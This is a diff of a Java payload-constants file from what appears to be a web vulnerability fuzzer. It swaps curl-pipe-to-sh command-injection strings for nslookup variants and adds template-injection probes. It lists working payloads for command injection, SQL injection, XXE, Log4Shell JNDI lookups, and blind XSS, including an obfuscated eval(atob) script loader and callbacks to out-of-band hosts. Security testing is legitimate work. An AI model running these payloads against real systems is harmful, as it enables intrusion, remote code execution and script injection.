@@ -36,20 +36,26 @@ public class PayloadConstants {
             new PayloadInfo("$(env)", "$(env)"),
             new PayloadInfo("{fuzz}.ssrf.tejq8.zcyy.fun", "{hash}.ssrf.tejq8.zcyy.fun"),
             new PayloadInfo("null", "null"),
-            new PayloadInfo("'`curl$IFS@{fuzz}.cmdi1.tejq8.zcyy.fun|sh`'$(curl$IFS@{fuzz}.cmdi1.tejq8.zcyy.fun|sh)", "cmdi curl"),
+            new PayloadInfo("'`nslookup$IFS@{hash}.cmdi1.tejq8.zcyy.fun|sh`'$(nslookup$IFS@{hash}.cmdi1.tejq8.zcyy.fun|sh)", "cmdi 1"),
+            new PayloadInfo("&nslookup {hash}.cmdi2.tejq8.zcyy.fun&'\\\"`0&nslookup {hash}.cmdi2.tejq8.zcyy.fun&`'", "cmdi 2"),
+            new PayloadInfo("/*$(nslookup cmdi3.tejq8.zcyy.fun)`nslookup cmdi3.tejq8.zcyy.fun``*/-nslookup(cmdi3.tejq8.zcyy.fun)-'/*$(nslookup cmdi3.tejq8.zcyy.fun)`nslookup cmdi3.tejq8.zcyy.fun` #*/-nslookup(cmdi3.tejq8.zcyy.fun)||'\\\"||nslookup(cmdi3.tejq8.zcyy.fun)||\\\"/*`*/", "cmdi 3"),
             new PayloadInfo("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [!ENTITY delay SYSTEM \"http://httpbin.org/delay/7\"]><root>&delay;</root>", "xml delay 7"),
-            new PayloadInfo(");?/%ff'\"><img/src=http://ig{fuzz}.tejq8.zcyy.fun>", ");?/%ff'\"><img>"),
-            new PayloadInfo("<link rel=\"stylesheet\" href=\"https://{hash}.lnk.tejq8.zcyy.fun/link.css\">", "<link>"),
-            new PayloadInfo("&ping -c 4 {fuzz}.cmdi2.tejq8.zcyy.fun&'\"`0&ping -c 4 {fuzz}.cmdi2.tejq8.zcyy.fun&`'", "cmdi ping"),
             new PayloadInfo("1' OR /*!sleep*/(LENGTH('{fuzz}hb')); -- ", "1' OR /*!sleep*/"),
             new PayloadInfo("1' OR 1/0; -- ", "1' OR 1/0; -- "),
-            new PayloadInfo("chaxx123'\">*/*/=end'''\"\"\"[${$(`;\\abcc8d: g00f%0d%0ac9w: g00s%c4%8d%c4%8av5m: f00Java", "chaxx + crlf"),
             new PayloadInfo("${j${main:\\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-{fuzz}.l4j.tejq8.zcyy.fun/}", "log4j-v"),
             new PayloadInfo("${jdni:ldap://x.{hash}.l4j.tejq8.zcyy.fun/a}", "log4j-v2"),
+            new PayloadInfo("chaxx123'\">*/*/=end'''\"\"\"[${$(`;\\abcc8d: g00f%0d%0ac9w: g00s%c4%8d%c4%8av5m: f00Java", "chaxx + crlf"),
+            new PayloadInfo(");?/%ff'\"><img/src=http://ig{fuzz}.tejq8.zcyy.fun>", ");?/%ff'\"><img>"),
+            new PayloadInfo("<link rel=\"stylesheet\" href=\"https://{hash}.lnk.tejq8.zcyy.fun/link.css\">", "<link>"),
             new PayloadInfo("\"><script src=\"https://js.rip/nm\"></script>", "bxss1"),
-            new PayloadInfo("\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL25tIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>", "bxss2")
+            new PayloadInfo("\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL25tIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>", "bxss2"),
+            new PayloadInfo("{{111*88}}", "SSTI1"),
+            new PayloadInfo("${111*88}", "SSTI2"),
+            new PayloadInfo("#{111*88}", "SSTI3"),
+            new PayloadInfo("[[${111*88}]]", "SSTI4")
 
-    );
+
+            );
 
     /**
      * 参数模糊测试专用的payload列表
